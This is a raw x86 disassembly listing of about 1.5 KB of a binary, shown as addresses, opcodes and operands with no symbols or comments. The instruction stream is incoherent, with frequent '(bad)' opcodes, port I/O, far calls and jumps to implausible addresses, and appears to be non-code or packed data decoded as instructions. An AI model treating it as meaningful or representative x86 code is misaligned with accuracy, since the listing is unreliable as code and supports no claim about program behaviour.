  405e0e:	ret    0x7158
  405e11:	push   edi
  405e12:	mov    esi,esi
  405e14:	test   eax,0xde9fad59
  405e19:	out    dx,al
  405e1a:	ror    esp,1
  405e1c:	jmp    0x405dff
  405e1e:	pop    esp
  405e1f:	outs   dx,DWORD PTR ds:[esi]
  405e20:	rcr    BYTE PTR [edi+ebp*1],cl
  405e23:	fisttp DWORD PTR [ecx+eax*2+0x47fee625]
  405e2a:	imul   ecx,DWORD PTR [ecx-0x52],0xffffffc7
  405e2e:	sub    BYTE PTR [ebx+0x6e],bl
  405e31:	sub    esi,DWORD PTR [edi]
  405e33:	mov    esi,0xaf2b01f9
  405e38:	mov    esp,0xa31a64bb
  405e3d:	fstp   DWORD PTR [edi+0x42]
  405e40:	imul   DWORD PTR [ebx+0x67]
  405e43:	sub    dh,BYTE PTR [esi]
  405e45:	stos   DWORD PTR es:[edi],eax
  405e46:	cwde   
  405e47:	dec    ecx
  405e48:	pop    esp
  405e49:	push   0x6d07f769
  405e4e:	mov    edi,0x1bf879e7
  405e53:	ret    
  405e54:	pusha  
  405e55:	jmp    0x405dee
  405e57:	lods   al,BYTE PTR ds:[esi]
  405e58:	mov    al,0xa3
  405e5a:	mov    eax,0x831780d
  405e5f:	iret   
  405e60:	jns    0x405e9e
  405e62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e63:	test   eax,0x1b1b2f3
  405e68:	dec    eax
  405e69:	mov    cl,0x7d
  405e6b:	sub    esi,esi
  405e6d:	loop   0x405ea3
  405e6f:	dec    ebx
  405e70:	call   0x308:0x9ab86a1a
  405e77:	ss xchg ecx,eax
  405e79:	leave  
  405e7a:	inc    ebp
  405e7b:	adc    bl,BYTE PTR [edi-0x127d7c77]
  405e81:	sbb    eax,DWORD PTR [ecx]
  405e83:	mov    al,ds:0xb23df90c
  405e88:	rcr    BYTE PTR [edi],cl
  405e8a:	mov    eax,0xc1226366
  405e8f:	fstp   TBYTE PTR [esi-0x25]
  405e92:	test   BYTE PTR [ebx-0x67e7f79f],ch
  405e98:	dec    eax
  405e99:	idiv   DWORD PTR [edx+0x256b6412]
  405e9f:	test   cl,ch
  405ea1:	test   BYTE PTR [ebp+ebx*8+0x18fd09ab],ch
  405ea8:	in     al,0xa2
  405eaa:	xor    al,0xf4
  405eac:	xor    cl,BYTE PTR [eax]
  405eae:	sbb    esp,DWORD PTR [edi]
  405eb0:	pop    ebp
  405eb1:	mov    edi,0x24c318a1
  405eb6:	call   0x3530:0x1784e27e
  405ebd:	pop    edi
  405ebe:	jg     0x405e4a
  405ec0:	adc    bl,BYTE PTR ds:0xb6992e81
  405ec6:	or     DWORD PTR [ebx+0x3f13323a],edi
  405ecc:	ins    DWORD PTR es:[edi],dx
  405ecd:	jae    0x405efc
  405ecf:	loope  0x405f2f
  405ed1:	cmp    eax,0x4196c98f
  405ed6:	bound  eax,QWORD PTR [edx+0x2c8a0d13]
  405edc:	sub    dl,al
  405ede:	loopne 0x405ef1
  405ee0:	jns    0x405e8d
  405ee2:	scas   eax,DWORD PTR es:[edi]
  405ee3:	mov    ebx,0x82c7384c
  405ee8:	lea    eax,[esi]
  405eea:	mov    ebp,0x6d2779b
  405eef:	inc    ebp
  405ef0:	adc    eax,0x7ad32f50
  405ef5:	xor    BYTE PTR [ecx],al
  405ef7:	push   ecx
  405ef8:	jno    0x405e87
  405efa:	out    0x6d,eax
  405efc:	dec    ebp
  405efd:	into   
  405efe:	nop
  405eff:	daa    
  405f00:	cdq    
  405f01:	and    eax,0xf3add93d
  405f06:	js     0x405ed5
  405f08:	inc    esi
  405f09:	lods   eax,DWORD PTR ds:[esi]
  405f0a:	push   DWORD PTR [eax+0x41]
  405f0d:	and    BYTE PTR [edx+esi*2+0x4d],dl
  405f11:	(bad)  
  405f12:	cwde   
  405f13:	aas    
  405f14:	out    dx,eax
  405f15:	scas   eax,DWORD PTR es:[edi]
  405f16:	push   esp
  405f17:	clc    
  405f18:	dec    BYTE PTR ds:0x3408d30b
  405f1e:	or     eax,0xfa33f4bd
  405f23:	mov    ah,0xe8
  405f25:	jle    0x405f00
  405f27:	xchg   DWORD PTR [edi-0x63],ebx
  405f2a:	jge    0x405f60
  405f2c:	push   ecx
  405f2d:	popa   
  405f2e:	clc    
  405f2f:	mov    bl,0x97
  405f31:	aad    0xca
  405f33:	cmp    bl,BYTE PTR [ecx]
  405f35:	push   eax
  405f36:	xor    al,0xd1
  405f38:	adc    eax,0xc6dec722
  405f3d:	push   cs
  405f3e:	jnp    0x405f9c
  405f40:	jg     0x405ed5
  405f42:	xchg   esp,eax
  405f43:	shr    BYTE PTR [eax+0x55],cl
  405f46:	std    
  405f47:	in     al,0xbe
  405f49:	adc    BYTE PTR ds:0xbe32b82b,al
  405f4f:	sbb    BYTE PTR [esi+ecx*2+0x74fbd75b],0xcb
  405f57:	mov    al,ds:0x58160293
  405f5c:	cmp    al,0x34
  405f5e:	mov    bh,BYTE PTR [edx]
  405f60:	imul   BYTE PTR [esp+edi*2-0x4]
  405f64:	or     eax,DWORD PTR [edi-0x4b]
  405f67:	pusha  
  405f68:	fsubr  QWORD PTR [edx+0x6988195e]
  405f6e:	retf   
  405f6f:	ror    edx,0x7
  405f72:	loopne 0x405f83
  405f74:	xchg   ebp,eax
  405f75:	in     al,0xc3
  405f77:	mov    eax,ds:0x5adbec75
  405f7c:	sbb    al,ch
  405f7e:	mov    esi,0xf37b7884
  405f83:	in     eax,0xe7
  405f85:	pop    es
  405f86:	jmp    0x7ec51365
  405f8b:	cmc    
  405f8c:	fwait
  405f8d:	mov    al,0xb4
  405f8f:	cdq    
  405f90:	(bad)  
  405f91:	sti    
  405f92:	xor    al,0xe4
  405f94:	sub    eax,0x64927a2b
  405f99:	dec    ebp
  405f9a:	(bad)  
  405f9b:	int3   
  405f9c:	mov    ds:0x356556ec,eax
  405fa1:	jp     0x405fd8
  405fa3:	in     eax,dx
  405fa4:	xchg   ebp,eax
  405fa5:	in     al,dx
  405fa6:	mov    dh,0x57
  405fa8:	je     0x405f42
  405faa:	retf   
  405fab:	xchg   edx,eax
  405fac:	(bad)  
  405fad:	cmp    al,0xf0
  405faf:	rol    DWORD PTR [esi],1
  405fb1:	sub    DWORD PTR [edi-0x16],esi
  405fb4:	fwait
  405fb5:	rcr    DWORD PTR [ebp+0x5e],1
  405fb8:	iret   
  405fb9:	inc    ebp
  405fba:	push   edx
  405fbb:	or     al,0x3
  405fbe:	push   ss
  405fbf:	(bad)  [ebx+0x1a39a051]
  405fc5:	add    ebp,DWORD PTR [ebx]
  405fc7:	sub    al,0x1e
  405fc9:	add    al,0x82
  405fcb:	das    
  405fcc:	ins    DWORD PTR es:[edi],dx
  405fcd:	pop    ecx
  405fce:	xlat   BYTE PTR ds:[ebx]
  405fcf:	repz push esi
  405fd1:	jb     0x405fdd
  405fd3:	cld    
  405fd4:	in     eax,0x52
  405fd6:	ins    BYTE PTR es:[edi],dx
  405fd7:	xor    al,BYTE PTR [edi+0x8]
  405fda:	push   0x8ea24223
  405fdf:	repnz (bad) 
  405fe1:	fadd   QWORD PTR [edi]
  405fe3:	sub    BYTE PTR [edi],dh
  405fe5:	jne    0x406056
  405fe7:	cwde   
  405fe8:	or     BYTE PTR [edi],dh
  405fea:	arpl   WORD PTR [eax],si
  405fec:	in     eax,0x1
  405fee:	scas   eax,DWORD PTR es:[edi]
  405fef:	mov    bl,0xe6
  405ff1:	sbb    esi,esp
  405ff3:	retf   0x1a46
  405ff6:	xor    al,0x7
  405ff8:	adc    ch,BYTE PTR [ecx]
  405ffa:	mov    di,0xfdee
  405ffe:	sub    eax,0x37f1955e
  406003:	xchg   DWORD PTR [eax+0x6c3ca0f1],esi
  406009:	push   ds
  40600a:	mov    esp,DWORD PTR [eax-0x7262cf9a]
  406010:	adc    ah,BYTE PTR [eax+0x3e]
  406013:	iret   
  406014:	jae    0x406033
  406016:	jae    0x405fc0
  406018:	in     al,0xc4
  40601a:	jnp    0x406063
  40601c:	xchg   ebx,eax
  40601d:	sar    BYTE PTR [edi],cl
  40601f:	rcl    esp,cl
  406021:	sub    BYTE PTR [eax],ch
  406023:	jmp    0x406038
  406025:	fadd   st,st(2)
  406027:	add    eax,0x5c3ddc77
  40602c:	xchg   edx,eax
  40602d:	push   ds
  40602e:	jno    0x406024
  406030:	mov    al,ds:0x7004b10e
  406035:	mov    eax,DWORD PTR [edi-0x5dc257d3]
  40603b:	fidiv  WORD PTR [ebp-0x117e405c]
  406041:	cli    
  406042:	push   edx
  406043:	sub    DWORD PTR [eax-0x64203812],ebx
  406049:	xchg   BYTE PTR [edx+0x122179ec],bh
  40604f:	sub    ecx,eax
  406051:	cli    
  406052:	mov    ah,0x4e
  406054:	(bad)  
  406055:	in     eax,dx
  406056:	mov    ds:0x1ab1aaea,eax
  40605b:	fnsave [edi]
  40605d:	imul   eax,DWORD PTR [eax-0x531c6dbe],0x8cc0a62c
  406067:	(bad)  
  406068:	jmp    0x901f7d64
  40606d:	jle    0x40606a
  40606f:	mov    ebp,0xd1ebaee3
  406074:	mov    edx,0x8c98b5a6
  406079:	(bad)  
  40607a:	in     eax,0xc5
  40607c:	ss push esp
  40607e:	clc    
  40607f:	std    
  406080:	hlt    
  406081:	fs cmp eax,0x2ad86e56
  406087:	mov    ebp,0xfa01911d
  40608c:	fwait
  40608d:	add    eax,0x52f70520
  406092:	outs   dx,BYTE PTR ds:[esi]
  406093:	ins    DWORD PTR es:[edi],dx
  406094:	or     al,0x1e
  406096:	aam    0x15
  406098:	xchg   ebx,eax
  406099:	mov    dh,0x88
  40609b:	pop    eax
  40609c:	mov    ebp,0x76cf5f11
  4060a1:	test   DWORD PTR [ebx+0x7285724a],esp
  4060a7:	push   ebx
  4060a8:	pop    ecx
  4060a9:	adc    ebp,esp
  4060ab:	sbb    eax,0xa0470eb
  4060b0:	sub    eax,0xbd1e9cbe
  4060b5:	outs   dx,BYTE PTR ds:[esi]
  4060b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060b7:	ja     0x4060ca
  4060b9:	loope  0x406117
  4060bb:	inc    ebx
  4060bc:	mov    ?,WORD PTR [esi-0x45]
  4060bf:	and    ebx,0x7b
  4060c2:	mov    ecx,DWORD PTR [ecx+0x79]
  4060c5:	out    0x9c,al
  4060c7:	and    bh,BYTE PTR [ebx]
  4060c9:	jg     0x40604f
  4060cb:	lock mov dl,0xf2
  4060ce:	(bad)  
  4060cf:	ds cdq 
  4060d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060d2:	hlt    
  4060d3:	xchg   BYTE PTR [esi+eax*2+0x20],cl
  4060d7:	retf   0xfcbc
  4060da:	cmp    DWORD PTR [ebp+0x11564ed0],ebx
  4060e0:	mov    bh,0x81
  4060e2:	sar    DWORD PTR [eax+esi*8-0x5e19d8f8],cl
  4060e9:	das    
  4060ea:	jle    0x40607e
  4060ec:	(bad)  
  4060ed:	jp     0x40608b
  4060ef:	xor    al,0xc1
  4060f1:	push   ss
  4060f2:	rol    dh,1
  4060f4:	mov    bl,dl
  4060f6:	mov    edi,0xa3801a8c
  4060fb:	stc    
  4060fc:	retf   
  4060fd:	(bad)  
  4060fe:	aaa    
  4060ff:	mov    ds:0x22861185,eax
  406104:	adc    esi,DWORD PTR [edx+0x7b]
  406107:	sub    al,0x8e
  406109:	sbb    al,0xf8
  40610b:	xchg   edx,eax
  40610c:	inc    ebp
  40610d:	and    dl,BYTE PTR [esi+eiz*2+0x70d16b26]
  406114:	iret   
  406115:	out    0x88,al
  406117:	mov    esi,0x3f247c82
  40611c:	fbld   TBYTE PTR [ebp+0x5edd15e8]
  406122:	mov    eax,ds:0x676306e3
  406127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406128:	out    0xdc,eax
  40612a:	cmp    edx,DWORD PTR [ecx+0x17f757cf]
  406130:	mov    edx,0x5dfe4af9
  406135:	ins    DWORD PTR es:[edi],dx
  406136:	icebp  
  406137:	xchg   DWORD PTR [ebp-0x5e75144e],eax
  40613d:	pop    es
  40613e:	pop    ebp
  40613f:	or     al,0xeb
  406141:	pushf  
  406142:	shr    BYTE PTR [ebx-0x6a],cl
  406145:	lds    ecx,FWORD PTR [eax-0x26]
  406148:	jo     0x4060cc
  40614a:	pop    ss
  40614b:	sahf   
  40614c:	ss loop 0x406196
  40614f:	jmp    0x4061be
  406151:	mov    esp,0xc5a37454
  406156:	add    eax,0xd757de8a
  40615b:	xor    DWORD PTR [ebp+edi*1-0x12],ebp
  40615f:	sub    eax,eax
  406161:	jmp    0x406158
  406163:	jg     0x406128
  406165:	mov    ds:0x512f0e44,eax
  40616a:	mov    eax,ds:0xcbb4803
  40616f:	rcl    esp,0xc1
  406172:	loopne 0x406125
  406174:	push   cs
  406175:	popf   
  406176:	push   eax
  406177:	push   edx
  406178:	fwait
  406179:	pop    ecx
  40617a:	inc    esi
  40617b:	jne    0x4061a1
  40617d:	lock mov esi,0xd72ffad3
  406183:	arpl   WORD PTR [ecx-0x11],cx
  406186:	clc    
  406187:	lods   al,BYTE PTR ds:[esi]
  406188:	sbb    edi,edx
  40618a:	push   esp
  40618b:	or     al,BYTE PTR [esi+0x4e]
  40618e:	fldcw  WORD PTR [esi+0x4197adc4]
  406194:	sub    esi,edi
  406196:	xchg   ebx,eax
  406197:	dec    esp
  406198:	inc    eax
  406199:	mov    DWORD PTR [ecx],eax
  40619b:	jnp    0x4061e0
  40619d:	jne    0x406182
  40619f:	dec    edi
  4061a0:	rep ins BYTE PTR es:[edi],dx
  4061a2:	mov    ecx,0x2d8665e6
  4061a7:	ficomp DWORD PTR [esi]
  4061a9:	ret    
  4061aa:	mov    esi,0xba83e5f4
  4061af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061b0:	neg    BYTE PTR [edi*4-0x3098d1ef]
  4061b7:	retf   
  4061b8:	cld    
  4061b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061ba:	test   eax,0xa77ca4b6
  4061bf:	push   esp
  4061c0:	repnz or eax,0x81ba31ca
  4061c6:	dec    eax
  4061c7:	inc    edx
  4061c8:	mov    bh,0x9d
  4061ca:	ret    0x7c0e
  4061cd:	xor    ebx,esp
  4061cf:	test   BYTE PTR [ebx+0x63],dh
  4061d2:	aam    0xee
  4061d4:	pop    ecx
  4061d5:	jl     0x4061f6
  4061d7:	ins    BYTE PTR es:[edi],dx
  4061d8:	jmp    0x406175
  4061da:	std    
  4061db:	xor    BYTE PTR [edx],cl
  4061dd:	or     BYTE PTR ds:0xcc007e4e,cl
  4061e3:	push   cs
  4061e4:	xchg   ebx,esi
  4061e6:	sub    cl,BYTE PTR [esi]
  4061e8:	mov    di,0x1c36
  4061ec:	jnp    0x4061fd
  4061ee:	add    bh,ah
  4061f0:	pop    eax
  4061f1:	push   eax
  4061f2:	ja     0x406250
  4061f4:	jmp    0x406201
  4061f6:	(bad)  
  4061f7:	cdq    
  4061f8:	jmp    0x4061e2
  4061fa:	test   eax,0x5f611610
  4061ff:	pop    es
  406200:	xchg   edi,eax
  406201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406202:	cmp    BYTE PTR [edi+0x3ee49ac0],0x24
  406209:	shr    BYTE PTR [esi-0x67],0x36
  40620d:	push   esp
  40620e:	jae    0x4061dc
  406210:	dec    ebp
  406211:	push   ecx
  406212:	push   ebp
  406213:	aam    0x1b
  406215:	push   edx
  406216:	mov    al,ds:0xc35d8307
  40621b:	dec    esi
  40621c:	div    DWORD PTR [edx]
  40621e:	xchg   ecx,eax
  40621f:	jg     0x406240
  406221:	cmp    BYTE PTR [ebx],ch
  406223:	cmp    dl,ch
  406225:	adc    al,0x74
  406227:	mov    esi,0x27fc89d9
  40622c:	add    eax,0x431f4619
  406231:	arpl   WORD PTR [esi+0x39],bp
  406234:	or     bl,dh
  406236:	pop    ebp
  406237:	adc    BYTE PTR [ecx+0x18a13c7a],0xe
  40623e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40623f:	and    dh,0x71
  406242:	retf   0xf08f
  406245:	cmp    al,0xb9
  406247:	adc    BYTE PTR [eax-0x376a4094],cl
  40624d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40624e:	xchg   edx,eax
  40624f:	inc    edx
  406250:	dec    edi
  406251:	dec    edx
  406252:	imul   esp,edx,0xba12c8b8
  406258:	enter  0xc87a,0x11
  40625c:	adc    BYTE PTR [edx+0x4c],0xe9
  406260:	push   edx
  406261:	jl     0x4062b7
  406263:	mov    edx,0x69be8a06
  406268:	adc    eax,0x5d5d4c18
  40626d:	xor    al,0x4
  40626f:	xchg   ebp,eax
  406270:	loope  0x4061fa
  406272:	mov    eax,0xfc8705a0
  406277:	jnp    0x4062ee
  406279:	jmp    0x40624e
  40627b:	imul   esp,DWORD PTR [ebp+0x39],0xd29ef52b
  406282:	add    al,0xc2
  406284:	push   ds
  406285:	push   esp
  406286:	ja     0x4062e3
  406288:	outs   dx,BYTE PTR ds:[esi]
  406289:	sti    
  40628a:	pushf  
  40628b:	push   esp
  40628c:	xchg   BYTE PTR [eax+0x39],bl
  40628f:	pusha  
  406290:	sbb    al,0xa6
  406292:	lahf   
  406293:	sub    eax,0x82e04a22
  406298:	test   al,0xf9
  40629a:	outs   dx,DWORD PTR ds:[esi]
  40629b:	hlt    
  40629c:	mov    ah,0x44
  40629e:	sub    al,0x94
  4062a0:	add    esi,DWORD PTR [esi+0x2e4bd017]
  4062a6:	xchg   ebx,ecx
  4062a8:	push   0x47
  4062aa:	or     DWORD PTR [ebp+ebx*2-0x4d],edi
  4062ae:	lods   eax,DWORD PTR ds:[esi]
  4062af:	xchg   edi,eax
  4062b0:	jbe    0x406269
  4062b2:	add    edi,0xffffff9a
  4062b5:	xor    al,0x13
  4062b7:	pop    eax
  4062b8:	or     BYTE PTR [ebx+0xa],bl
  4062bb:	cmp    ebx,DWORD PTR [ebx-0x4be470bd]
  4062c1:	jns    0x4062c1
  4062c3:	ins    DWORD PTR es:[edi],dx
  4062c4:	mov    ch,bh
  4062c6:	fcmovb st,st(4)
  4062c8:	loop   0x40629a
  4062ca:	call   0xf00f3961
  4062cf:	push   ss
  4062d0:	adc    ecx,edi
  4062d2:	ror    ebp,cl
  4062d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062d5:	(bad)  
  4062d6:	sbb    eax,0x73784a1a
  4062db:	push   ds
  4062dc:	sbb    eax,0x23feb009
  4062e1:	ret    0xa7b6
  4062e4:	inc    edx
  4062e5:	loopne 0x40628b
  4062e7:	cli    
  4062e8:	sub    DWORD PTR [ecx+0x3f],ecx
  4062eb:	rcl    BYTE PTR [ebp+0xc],cl
  4062ee:	rcr    BYTE PTR [ebp-0x23],0x9e
  4062f2:	pop    eax
  4062f3:	es clc 
  4062f5:	cmp    ebp,DWORD PTR [ebp-0x2a42569b]
  4062fb:	mov    al,ds:0xe04e722
  406300:	cmp    bh,BYTE PTR [esi-0x62]
  406303:	lock lods eax,DWORD PTR ds:[esi]
  406305:	cs call 0x6fef:0x7e429822
  40630d:	out    dx,al
  40630e:	jae    0x406329
  406310:	int    0xf1
  406312:	arpl   WORD PTR [ebp-0x10],bx
  406315:	jmp    0x4a78c4bf
  40631a:	push   ebx
  40631b:	(bad)  
  40631c:	scas   eax,DWORD PTR es:[edi]
  40631d:	cld    
  40631e:	mov    bh,0x2e
  406320:	ror    dx,1
  406323:	(bad)  
  406324:	idiv   BYTE PTR [ebx+0x748b2f65]
  40632a:	arpl   WORD PTR [edi+0x65e6a018],sp
  406330:	es stos BYTE PTR es:[edi],al
  406332:	clc    
  406333:	add    al,BYTE PTR [ebp+0x62f38887]
  406339:	jmp    edx
  40633b:	push   ecx
  40633c:	dec    edx
  40633d:	sbb    eax,0xf921214c
  406342:	and    DWORD PTR [edx+0x34122100],ecx
  406348:	xchg   esi,eax
  406349:	cmp    ecx,edi
  40634b:	mov    ah,0x1b
  40634d:	in     eax,0x12
  40634f:	xor    DWORD PTR [ebx+0x43],edi
  406352:	enter  0x7631,0x34
  406356:	fld    DWORD PTR ds:[eax-0x40b0dd77]
  40635d:	pop    ebp
  40635e:	push   0x6a5b8928
  406363:	stos   BYTE PTR es:[edi],al
  406364:	daa    
  406365:	mov    WORD PTR [esi+0x4a60402c],?
  40636b:	jnp    0x40631d
  40636d:	xchg   edi,esp
  40636f:	adc    cl,BYTE PTR [eax+0x5cff4f4c]
  406375:	pcmpgtw mm0,QWORD PTR [ebp+0x74]
  406379:	add    edi,ebp
  40637b:	or     DWORD PTR [eax-0x20],ecx
  40637e:	call   0x48ec:0x1de1eb2e
  406385:	call   0x6778:0x1ec77346
  40638c:	xchg   ebp,eax
  40638d:	inc    ecx
  40638e:	jae    0x406381
  406390:	inc    esp
  406391:	push   ds
  406392:	cmp    edi,ebp
  406394:	lock pop ebp
  406396:	mov    ebx,0xc22a4fe6
  40639b:	mov    ebx,0xa6d0b25d
  4063a0:	das    
  4063a1:	loope  0x40639f
  4063a3:	pop    esp
  4063a4:	ret    0xd52f
  4063a7:	sbb    cl,BYTE PTR [edx+ebx*1+0x69]
  4063ab:	lods   al,BYTE PTR ds:[esi]
  4063ac:	test   DWORD PTR [ecx+edi*2-0x2217cb21],esp
  4063b3:	add    ebx,DWORD PTR [edx]
  4063b5:	es adc al,0x14
  4063b8:	xor    DWORD PTR [esi-0x4d],0xde0dba0d
  4063bf:	push   edx
  4063c0:	fiadd  WORD PTR [edi]
  4063c2:	push   DWORD PTR [edi+eax*1+0x62]
  4063c6:	cmp    DWORD PTR [esi-0x75ee07d7],ebp
  4063cc:	in     eax,0x4f
  4063ce:	(bad)  
  4063cf:	ud1    esp,esp
  4063d2:	sbb    ch,BYTE PTR [ebx+0x232da590]
  4063d8:	das    
  4063d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063da:	pusha  
  4063db:	ja     0x4063c0
  4063dd:	inc    eax
  4063de:	xor    BYTE PTR [esi+0x64],bh
  4063e1:	or     DWORD PTR [edx+0xc],edi
  4063e4:	gs scas al,BYTE PTR es:[edi]
  4063e6:	mov    bh,0xd
  4063e8:	mov    esi,DWORD PTR [ecx+0x6830095a]
  4063ee:	jo     0x4063ad
  4063f0:	call   0x42da8180
  4063f5:	jl     0x4063ee
  4063f7:	dec    eax
  4063f8:	les    edx,FWORD PTR [eax]
  4063fa:	pop    esp
  4063fb:	fild   WORD PTR [eax+0x6143b42c]
  406401:	adc    edx,0xffffffb2
  406404:	scas   eax,DWORD PTR es:[edi]
  406405:	or     ah,dh
  406407:	mov    ebx,0x9e76c33
  40640c:	xchg   edi,eax
  40640d:	popa   
  40640e:	out    dx,eax
  40640f:	pop    edi
  406410:	and    ch,BYTE PTR [edi+0x78]
  406413:	sbb    DWORD PTR [ebx],edi
  406415:	sbb    DWORD PTR [edi+0x76],esp
  406418:	pusha  
  406419:	(bad)  
  40641a:	pop    edi
  40641b:	mov    BYTE PTR [esi+0x494d1392],bl
  406421:	(bad)  
  406422:	out    dx,eax
  406423:	out    0xe1,al
  406425:	(bad)  
  406427:	in     eax,0x67
  406429:	push   ecx
  40642a:	loop   0x4063db
  40642c:	and    edi,edx
  40642e:	nop
  40642f:	or     DWORD PTR [edi+0x13],esp
  406432:	dec    esp
  406433:	push   es
  406434:	jmp    0x7dd2:0xba8fcd45
  40643b:	xor    edi,DWORD PTR ds:0x9a3dc2be
  406441:	jmp    0x4064ad
  406443:	add    DWORD PTR [ecx],esp
  406445:	test   eax,0xf9d85a10
  40644a:	or     dl,ch
  40644c:	and    DWORD PTR [edx+0x4f],edx
  40644f:	(bad)  
  406450:	pop    es
  406451:	and    ecx,DWORD PTR [ecx+0x424cbd95]
  406457:	dec    ebx
  406458:	int    0x8d
  40645a:	jge    0x4063f9
  40645c:	xlat   BYTE PTR ds:[ebx]
  40645d:	cmp    DWORD PTR [esi],0xedd6cd1b
  406463:	dec    esp
  406464:	(bad)  
  406468:	pop    ebx
  406469:	sbb    bl,BYTE PTR ds:0x2c7b70bc
  40646f:	or     DWORD PTR [ebp+0x46e84aa7],esi
  406475:	add    eax,0xfea4d818
  40647a:	mov    dl,0xb2
  40647c:	iret   
  40647d:	das    
  40647e:	test   eax,0xc14438
  406483:	and    al,0xe7
  406485:	adc    BYTE PTR [ebx-0x67],bh
  406488:	dec    esi
  406489:	push   0x277e43ff
  40648e:	inc    ebx
  40648f:	and    eax,DWORD PTR [ebx+0xa]
  406492:	dec    edx
  406493:	scas   eax,DWORD PTR es:[edi]
  406494:	adc    DWORD PTR [esi],0xfffffff8
  406497:	sub    DWORD PTR [edi+0x3a],edx
  40649a:	push   edx
  40649b:	pushf  
  40649c:	sbb    eax,0xd0d2033a
  4064a1:	mov    edi,0xaa2643c3
  4064a6:	call   0xe1fe:0xa1a21b08
  4064ad:	and    DWORD PTR [ecx-0x305857be],ebx
  4064b3:	dec    ecx
  4064b4:	pop    edx
  4064b5:	sbb    ebp,DWORD PTR ds:0x2b4b57cd
  4064bb:	ds test eax,0x6f788e0d
  4064c1:	(bad)  
  4064c2:	mov    dl,0x42
  4064c4:	ret    0x2cdd
  4064c7:	fs pop edi
  4064c9:	inc    esi
  4064ca:	loopne 0x406544
  4064cc:	push   ecx
  4064cd:	push   ds
  4064ce:	ss pop es
  4064d0:	pop    edx
  4064d1:	jmp    0x31be3e33
  4064d6:	das    
  4064d7:	(bad)  
  4064d8:	rol    BYTE PTR [edi+0x18],1
  4064db:	sbb    al,0x25
  4064dd:	das    
  4064de:	inc    ecx
  4064df:	out    dx,eax
  4064e0:	jmp    0x4064fc
  4064e2:	repnz test BYTE PTR [ebp+0x4d5485b6],cl
  4064e9:	pop    ds
  4064ea:	lahf   
  4064eb:	stos   DWORD PTR es:[edi],eax
  4064ec:	adc    ebp,DWORD PTR [esi-0x19]
  4064ef:	xchg   esi,eax
  4064f0:	and    al,0xf0
  4064f2:	xchg   ebx,eax
  4064f3:	adc    DWORD PTR [ebp+0x46],0x1db545de
  4064fa:	mov    BYTE PTR [ebp-0x5b],ch
  4064fd:	sub    ecx,esi
  4064ff:	ins    BYTE PTR es:[edi],dx
  406500:	push   ecx
  406501:	cmp    eax,0x70cd642d
  406506:	cmp    eax,0x5ca46f6f
  40650b:	push   ds
  40650c:	xchg   esp,eax
  40650d:	cmp    edx,esp
  40650f:	jmp    FWORD PTR [ebx+0x2e693a0b]
  406515:	repz cmp dh,ch
  406518:	fldcw  WORD PTR [eax+ebp*2+0x69]
  40651c:	and    BYTE PTR [edx],dl
  40651e:	nop
  40651f:	fisttp WORD PTR [eax+edi*8-0x6e]
  406523:	shl    BYTE PTR [edi-0x33],0xc
  406527:	imul   edi,DWORD PTR [edi+ebp*4+0x7975073d],0xffffff9c
  40652f:	inc    ecx
  406530:	das    
  406531:	push   esi
  406532:	adc    eax,0xe4b60616
  406537:	xchg   ebp,eax
  406538:	lods   eax,DWORD PTR ds:[esi]
  406539:	xchg   ebp,eax
  40653a:	sar    DWORD PTR [edi],0xed
  40653d:	or     esp,DWORD PTR [eax+ecx*4+0x10469b]
  406544:	sub    al,0x24
  406546:	repnz inc edx
  406548:	ss cmp eax,0xb2020c62
  40654e:	inc    edi
  40654f:	and    ebp,DWORD PTR [edx+eax*1-0x19]
  406553:	add    dl,cl
  406555:	sbb    bh,0xd6
  406558:	leave  
  406559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40655a:	jecxz  0x406528
  40655c:	and    al,0xda
  40655e:	adc    ebx,0x9727d269
  406564:	(bad)  
  406565:	out    dx,eax
  406566:	aad    0xb4
  406568:	mov    esp,0x759a9c5
  40656d:	mov    dl,0x32
  40656f:	nop
  406570:	int3   
  406571:	jge    0x406583
  406573:	mov    DWORD PTR [ebx+edi*8+0x4c2a7a04],edi
  40657a:	add    ecx,DWORD PTR [ebx+0x58]
  40657d:	and    eax,0x195d2d46
  406582:	daa    
  406583:	push   ds
  406584:	mov    bl,0xd
  406586:	cmp    BYTE PTR [edi+0x353624fb],dh
  40658c:	ins    BYTE PTR es:[edi],dx
  40658d:	dec    esp
  40658e:	loop   0x406583
  406590:	out    dx,eax
  406591:	test   BYTE PTR [esi+0x6b],ah
  406594:	mov    edx,0xb96e96d6
  406599:	imul   edi,DWORD PTR [edi-0x31],0xab9f7836
  4065a0:	mov    ebp,esi
  4065a2:	dec    eax
  4065a3:	addr16 jmp 0x4501:0x269ea799
  4065ab:	es into 
  4065ad:	mov    ds:0x840b3c1e,eax
  4065b2:	jecxz  0x406606
  4065b4:	sub    edx,esp
  4065b6:	lahf   
  4065b7:	push   ds
  4065b8:	fisubr WORD PTR [esi-0x5c]
  4065bb:	jmp    FWORD PTR [ebx-0x4f5a110f]
  4065c1:	fucomip st,st(0)
  4065c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065c4:	loope  0x406589
  4065c6:	js     0x4065d1
  4065c8:	fisttp DWORD PTR [esi+eax*2]
  4065cb:	jmp    0xdf76f985
  4065d0:	hlt    
  4065d1:	fucom  st(0)
  4065d3:	xchg   edx,eax
  4065d4:	mov    dl,0xf9
  4065d6:	xor    bh,BYTE PTR [esi]
  4065d8:	mov    dl,0xb1
  4065da:	fdiv   QWORD PTR [ebx-0x21fef8f6]
  4065e0:	lds    esp,FWORD PTR [edi+0x73]
  4065e3:	add    ch,BYTE PTR [esi]
  4065e5:	fucomi st,st(0)
  4065e7:	aas    
  4065e8:	mov    ebx,0x4cb422a7
  4065ed:	jl     0x382e2524
  4065f3:	and    al,0xfd
  4065f5:	inc    esp
  4065f6:	xchg   ecx,eax
  4065f7:	and    DWORD PTR ds:0xb8a256e4,eax
  4065fd:	fnop   
